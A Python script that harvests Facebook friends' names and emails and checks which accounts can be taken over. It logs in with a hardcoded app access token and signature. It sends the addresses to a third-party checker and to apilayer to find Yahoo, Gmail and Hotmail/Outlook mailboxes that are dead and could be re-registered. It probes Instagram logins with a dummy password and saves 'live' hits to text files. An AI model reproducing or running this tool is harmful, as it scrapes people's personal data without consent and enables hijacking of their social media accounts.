import requests,json,sys
from os import system
from big_letters import print_big as ban
from time import sleep
from InstagramAPI import InstagramAPI
######################################
def yahoo(email):
    url_ = "http://widhitools.000webhostapp.com/api/yahoo.php?email="
    r = requests.post(url=url_+email).json()
    if r['status']== 'die':
        with open('yahoo_live.txt','a')as f1:
            f1.write(z['name']+" >> "+z['email']+'\n')
        system(blue)
        Beep(3000,100)
        global q
        q='Live yahoo'
        insta(z['email'])

def gmail(email):
    url_ap =("http://apilayer.net/api/check?access_key="+key+"&email="+email+"&smtp=1&format=1")
    info = json.loads(requests.get(url_ap).text)
    try:
        if info['smtp_check']==0:
            with open('gmail_live.txt','a')as f2:
                f2.write(z['name']+" >> "+z['email']+'\n')
            system(blue)
            Beep(3000,100)
            global q
            q='Live gmail'
            insta(z['email'])
    except KeyError :
        print('\n\n[!]Error please contact with the author [mohamed hassan] to solve it \n\n')
        

def hotmail(email):
    url_ap =("http://apilayer.net/api/check?access_key="+key+"email="+email+"&smtp=1&format=1")
    info = json.loads(requests.get(url_ap).text)
    try:
        if info['smtp_check']==0:
            with open('hotmail_live.txt','a')as f4:
                f4.write(z['name']+" >> "+z['email']+'\n')
            system(blue)
            Beep(3000,100)
            global q
            q='Live hotmail'
            insta(z['email'])
    except KeyError :
        print('\n\n[!]Error please contact with the author [mohamed hassan] to solve it \n\n')

def insta(email):
    api = InstagramAPI(z['email'], "sxzxcxzwe")
    api.login()
    o=str(api.LastJson)
    if "The password you entered is incorrect" in o:
        with open('insta_live.txt',mode="a") as f3:
            f3.write(z['name']+" >> "+z['email']+"\n")
        Beep(3000,100)
        global w
        w=' , insta'
######################################
if 'win' in sys.platform:
    from winsound import Beep
    clear='cls'
    green='color a'
    blue='color 1'
elif 'linux' in sys.platform:
    clear='clear'
    green='echo -e "\e[34m"'
    blue='echo -e "\e[36m"'
    def Beep(a,b):
        s=a+b
else:
    clear=''
    green=''
    blue=''
######################################
system(clear)
system(green)
print('''
-------------------------------------
           scripted by :

 |\  /| |--| |    /\  |\  /|  --- |-\\
 | || | |  | |_  |--| | || | |--- |  |
 |    | |--| | | |  | |    | |___ |-/

 |  |  /\   ____  ____  /\  |\  |
 |--| |--| |___  |___  |--| | \ |
 |  | |  | ____| ____| |  | |  \|

  /\  |\  | |    |  ---  ---
 |--| | \ | | || | |--- |__/
 |  | |  \| |/  \| |___ |  \\

''')
sleep(4)
system(clear)
print('\n')
ban('   lord')
idt=input('[+]Enter your username : ')
passw=input('[+]Enter your password : ')
key=input('[+]Enter your key : ')
url = ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
data= requests.get(url)
op = json.loads(data.text)
if ('access_token' in op):
    token = (op["access_token"])
    print ("Login Successed")
else:
    print ("Login Is Failed!")
    exit()
r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
a = json.loads(r.text)
urrrl=idt+'_friends_mails.txt'
for i in a['data']:
    system(green)
    x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
    z = json.loads(x.text)
    try:
        q=''
        w=''
        with open (urrrl,'a')as f:
            f.write(z['name'] +' >> ' +z['email'] + '\n')
        if 'yahoo' in z['email']:
            yahoo(z['email'])
            print (z['name'] +' >> ' + z['email']+' >> '+q+w+'\n\n')
        elif 'gmail'in z['email']:
            gmail(z['email'])
            print (z['name'] +' >> ' + z['email']+' >> '+q+w+'\n\n')
        elif 'hotmail'in z['email']:
            hotmail(z['email'])
            print (z['name'] +' >> ' + z['email']+' >> '+q+w+'\n\n')
        elif 'outlook' in z['email']:
            hotmail(z['email'])
            print (z['name'] +' >> ' + z['email']+' >> '+q+w+'\n\n')
        else:
            print (z['name'] +' >> ' + z['email']+' >> '+q+w+'\n\n')
    except:
        continue
    
f.close()
try:
    f1.close()
except:
    pass
try:
    f2.close()
except:
    pass
try:
    f3.close()
except:
    pass
try:
    f4.close()
except:
    pass
print('\n\n                    [+]finished[+]\n\n')
print('\n\n          [+]The lists saved in the main folder[+]\n\n')
input()
